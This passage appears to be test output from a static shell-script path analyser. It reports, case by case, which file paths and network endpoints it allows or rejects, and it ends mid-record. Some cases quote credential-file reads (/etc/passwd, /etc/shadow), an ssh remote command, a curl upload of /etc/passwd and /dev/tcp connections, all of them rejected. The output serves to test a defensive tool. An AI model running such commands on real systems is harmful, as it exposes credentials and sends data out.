UNRESOLVED line=396 reason=dynamic shell parameter $6 expression="$dfd"
UNRESOLVED line=419 reason=dynamic shell parameter $3 expression="$file"
UNRESOLVED line=461 reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=593 reason=array assignment is outside the accepted scalar subset expression=WPI_MI_DEVICE=(...)
UNRESOLVED line=593 reason=array assignment is outside the accepted scalar subset expression=WPI_MI_FSTYPE=(...)
UNRESOLVED line=593 reason=array assignment is outside the accepted scalar subset expression=WPI_MI_POINT=(...)
UNRESOLVED line=593 reason=array assignment is outside the accepted scalar subset expression=WPI_MI_ROOT=(...)
UNRESOLVED line=593 reason=array assignment is outside the accepted scalar subset expression=WPI_MI_SOURCE=(...)
UNRESOLVED line=595 reason=dynamic shell parameter $1 expression="$file"
UNRESOLVED line=597 reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=619 reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_DEVICE+=
UNRESOLVED line=619 reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_POINT+=
UNRESOLVED line=619 reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_ROOT+=
UNRESOLVED line=619 reason=dynamic command name: dynamic shell parameter $3 expression="$device"
UNRESOLVED line=619 reason=dynamic command name: dynamic shell parameter $4 expression="$root"
UNRESOLVED line=619 reason=dynamic command name: dynamic shell parameter $5 expression="$mount_point"
UNRESOLVED line=620 reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_FSTYPE+=
UNRESOLVED line=620 reason=compound assignment is outside the accepted scalar subset expression=WPI_MI_SOURCE+=
UNRESOLVED line=620 reason=dynamic command name: dynamic shell parameter $1 expression="$fstype"
UNRESOLVED line=620 reason=dynamic command name: dynamic shell parameter $2 expression="$source"
UNRESOLVED line=635 reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=642 reason=unpinned variable WPI_LEAF_FD expression="$outfd"
UNRESOLVED line=662 reason=array assignment is outside the accepted scalar subset expression=points=(...)
UNRESOLVED line=671 reason=array assignment is outside the accepted scalar subset expression=root_candidates=(...)
UNRESOLVED line=677 reason=array assignment is outside the accepted scalar subset expression=roots=(...)
UNRESOLVED line=682 reason=compound assignment is outside the accepted scalar subset expression=roots+=
UNRESOLVED line=682 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=708 reason=unpinned variable WPI_LEAF_FD expression="$pfd"
UNRESOLVED line=720 reason=unpinned variable WPI_LEAF_FD expression="$pfd"
UNRESOLVED line=723 reason=unpinned variable WPI_LEAF_FD expression="$pfd"
UNRESOLVED line=750 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=751 reason=opaque command argument: unpinned variable WPI_MOUNT_PROJECTION_DIGEST expression="mount_topology_mismatch observed=$WPI_MOUNT_PROJECTION_DIGEST attested=$WPI_ATTESTED_MOUNTINFO_SHA256 format=normalised_path_projection_v2"
UNRESOLVED line=762 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=763 reason=opaque command argument: unpinned variable WPI_MOUNT_BEFORE expression="mount_topology_changed before=$before after=$WPI_MOUNT_PROJECTION_DIGEST format=normalised_path_projection_v2"
UNRESOLVED line=769 reason=dynamic shell parameter $2 expression="$path"
UNRESOLVED line=849 reason=opaque command builtin has no registered path-argument contract expression=builtin
UNRESOLVED line=850 reason=opaque command builtin has no registered path-argument contract expression=builtin
UNRESOLVED line=853 reason=opaque command argument: unpinned variable RUNID expression="$RUNID"
UNRESOLVED line=853 reason=opaque command rp0_require_safe_component has no registered path-argument contract expression=rp0_require_safe_component
UNRESOLVED line=854 reason=opaque command argument: unpinned variable EV_STAGE_ID expression="$EV_STAGE_ID"
UNRESOLVED line=854 reason=opaque command rp0_require_safe_component has no registered path-argument contract expression=rp0_require_safe_component
UNRESOLVED line=860 reason=opaque command  has no registered path-argument contract expression=
UNRESOLVED line=924 reason=unpinned variable WPI_CAP_OUT expression="$out"
UNRESOLVED line=925 reason=unpinned variable WPI_CAP_OUT expression="$out"
UNRESOLVED line=927 reason=unpinned variable WPI_CAP_OUT expression="$out"
UNRESOLVED line=929 reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=1010 reason=unpinned variable WPI_CAP_OUT expression="$WPI_CAP_OUT"
UNRESOLVED line=1011 reason=unpinned variable WPI_CAP_ERR expression="$WPI_CAP_ERR"
UNRESOLVED line=1012 reason=opaque command -s has no registered path-argument contract expression=-s
UNRESOLVED line=1012 reason=opaque command argument: unpinned variable WPI_CAP_ERR expression="$WPI_CAP_ERR"
UNRESOLVED line=1012 reason=unpinned variable WPI_CAP_OUT expression="$WPI_CAP_OUT"
UNRESOLVED line=1013 reason=opaque command -s has no registered path-argument contract expression=-s
UNRESOLVED line=1013 reason=opaque command argument: unpinned variable WPI_CAP_OUT expression="$WPI_CAP_OUT"
UNRESOLVED line=1013 reason=unpinned variable WPI_CAP_ERR expression="$WPI_CAP_ERR"
UNRESOLVED line=1043 reason=unpinned variable WPI_CAP_OUT expression="$out"
UNRESOLVED line=1045 reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
UNRESOLVED line=1426 reason=unpinned variable WPI_READ_DIAG_FD expression="$dfd"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
```

## Complete GREEN transcript (repaired round-5 bytes, `28848D60…DF9C`)

```text
=== green ===
PATHSCOPE shell=green.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/input verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:assignment prefix,line=3:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== literal ===
PATHSCOPE shell=literal.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== assembled ===
PATHSCOPE shell=assembled.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc verdict=FORBID rule=- sources=NONE uses=line=2:assignment prefix
PATH value=/etc/mtc-bridge/x verdict=FORBID rule=- sources=NONE uses=line=4:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== dynamic ===
PATHSCOPE shell=dynamic.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=coverage reason=assignment value is not statically known: command substitution expression=p="$(printf /safe)"
UNRESOLVED line=3 kind=unresolved_path reason=cat argument is not statically known: command substitution expression="$p/x"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== nested ===
PATHSCOPE shell=nested.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/shadow verdict=FORBID rule=- sources=NONE uses=line=2:cat
UNRESOLVED line=2 kind=coverage reason=assignment value is not statically known: command substitution expression=unused="$(cat /etc/shadow)"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== pushd ===
PATHSCOPE shell=pushd.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:pushd
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== pushd_forbidden ===
PATHSCOPE shell=pushd_forbidden.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc verdict=FORBID rule=- sources=NONE uses=line=2:pushd
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== popd_stack ===
PATHSCOPE shell=popd_stack.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== trap ===
PATHSCOPE shell=trap.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== ssh ===
PATHSCOPE shell=ssh.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
ENDPOINT value=198.51.100.10:22 verdict=FORBID rule=- sources=HOST uses=line=2:ssh
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== ssh_command ===
PATHSCOPE shell=ssh_command.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
ENDPOINT value=198.51.100.10:2222 verdict=FORBID rule=- sources=HOST uses=line=2:ssh
UNRESOLVED line=2 kind=coverage reason=ssh remote command text executes on the remote host and is outside the local static path domain expression='cat /etc/passwd'
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== getent ===
PATHSCOPE shell=getent.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=1 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=unresolved_endpoint reason=getent resolves the hosts database through NSS, whose backing service set (files, DNS, LDAP, NIS, systemd-resolved) is host configuration and is not statically determined expression=getent
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== find_exec ===
PATHSCOPE shell=find_exec.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:find
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== find_unknown ===
PATHSCOPE shell=find_unknown.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:find
UNRESOLVED line=2 kind=coverage reason=find has no modeled grammar for the predicate -pathscope-unmodeled expression=-pathscope-unmodeled
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== curl_upload ===
PATHSCOPE shell=curl_upload.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:curl
ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:curl
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== curl_net ===
PATHSCOPE shell=curl_net.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=URL uses=line=2:curl
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== tar_option ===
PATHSCOPE shell=tar_option.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/pathscope-evil.tar verdict=FORBID rule=- sources=NONE uses=line=2:tar
PATH value=/safe verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:tar
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== cp_option ===
PATHSCOPE shell=cp_option.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc verdict=FORBID rule=- sources=NONE uses=line=2:cp
PATH value=/safe/input verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cp
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== cp_unknown ===
PATHSCOPE shell=cp_unknown.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=2 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/a verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cp
PATH value=/safe/b verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cp
UNRESOLVED line=2 kind=coverage reason=cp has no modeled grammar for option --pathscope-unmodeled expression=--pathscope-unmodeled=1
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== python_c ===
PATHSCOPE shell=python_c.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=coverage reason=python3 -c program text is opaque to static path analysis and can open any path or endpoint expression=-c
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== alias ===
PATHSCOPE shell=alias.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== hash_p ===
PATHSCOPE shell=hash_p.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:hash
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== mapfile_cb ===
PATHSCOPE shell=mapfile_cb.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/passwd verdict=FORBID rule=- sources=NONE uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== systemctl_link ===
PATHSCOPE shell=systemctl_link.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=coverage reason=systemctl verb link is not in the modeled read-only set and can install, link or remove unit files expression=link
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== jobs_x ===
PATHSCOPE shell=jobs_x.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=coverage reason=jobs option -x changes the operand grammar in a way this tool does not model expression=-x
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== tilde ===
PATHSCOPE shell=tilde.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=unresolved_path reason=cat argument is not statically known: tilde expansion depends on HOME, which is not a pinned absolute constant expression=~/secret
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== tilde_user ===
PATHSCOPE shell=tilde_user.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=unresolved_path reason=cat argument is not statically known: tilde expansion ~gatea names a home directory that is not statically known expression=~gatea/secret
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== tilde_home ===
PATHSCOPE shell=tilde_home.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/home/gatea/secret verdict=FORBID rule=- sources=HOME uses=line=2:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== symlink_lexical ===
PATHSCOPE shell=symlink_lexical.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/link/passwd verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:cat
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== redir_rw ===
PATHSCOPE shell=redir_rw.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/x verdict=FORBID rule=- sources=NONE uses=line=2:redirection <>
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== redir_clobber ===
PATHSCOPE shell=redir_clobber.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/y verdict=FORBID rule=- sources=NONE uses=line=2:redirection >|
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== redir_amp ===
PATHSCOPE shell=redir_amp.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/z verdict=FORBID rule=- sources=NONE uses=line=2:redirection &>
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== fddup ===
PATHSCOPE shell=fddup.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== exec_redir ===
PATHSCOPE shell=exec_redir.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/safe/out verdict=ALLOW-LEXICAL rule=/safe/** sources=ROOT uses=line=2:redirection >
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== devtcp ===
PATHSCOPE shell=devtcp.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
ENDPOINT value=198.51.100.10:8790 verdict=FORBID rule=- sources=NONE uses=line=2:redirection < /dev/tcp
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== devtcp_allow ===
PATHSCOPE shell=devtcp_allow.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=1
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=1 parse_issue_count=0
ENDPOINT value=127.0.0.1:8790 verdict=ALLOW-LEXICAL rule=127.0.0.1:8790 sources=NONE uses=line=2:redirection < /dev/tcp
UNRESOLVED line=2 kind=provenance reason=allowlisted endpoint has no preregistered-constant provenance expression=/dev/tcp/127.0.0.1/8790
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== heredoc ===
PATHSCOPE shell=heredoc.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== heredoc_subst ===
PATHSCOPE shell=heredoc_subst.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=1 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATH value=/etc/shadow verdict=FORBID rule=- sources=NONE uses=line=3:cat
PATHSCOPE verdict=REJECT rc=1 reason=path_outside_allowlist
COMMAND_RC=1
=== heredoc_quoted ===
PATHSCOPE shell=heredoc_quoted.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== herestring ===
PATHSCOPE shell=herestring.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=0 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
PATHSCOPE verdict=PASS rc=0 reason=closed_and_allowlisted_lexical_argv_scope
COMMAND_RC=0
=== array ===
PATHSCOPE shell=array.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=1 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=coverage reason=array assignment is outside the accepted scalar subset expression=A=(...)
UNRESOLVED line=3 kind=unresolved_path reason=cat argument is not statically known: unsupported parameter expansion ${A[0]} expression="${A[0]}"
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== brace ===
PATHSCOPE shell=brace.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
UNRESOLVED line=2 kind=unresolved_path reason=cat argument is not statically known: brace expansion makes the word set dynamic expression=/safe/{a,b}
PATHSCOPE verdict=REJECT rc=3 reason=static_resolution_incomplete
COMMAND_RC=3
=== arith ===
PATHSCOPE shell=arith.sh
PATHSCOPE semantics=lexical_argv_scope symlink_resolution=not_established mount_boundary=not_established host_probe=none
PATHSCOPE resolved_fs_path_count=0 resolved_net_endpoint_count=0
PATHSCOPE unresolved_path_count=1 unresolved_endpoint_count=0 coverage_issue_count=0 provenance_issue_count=0 parse_issue_count=0
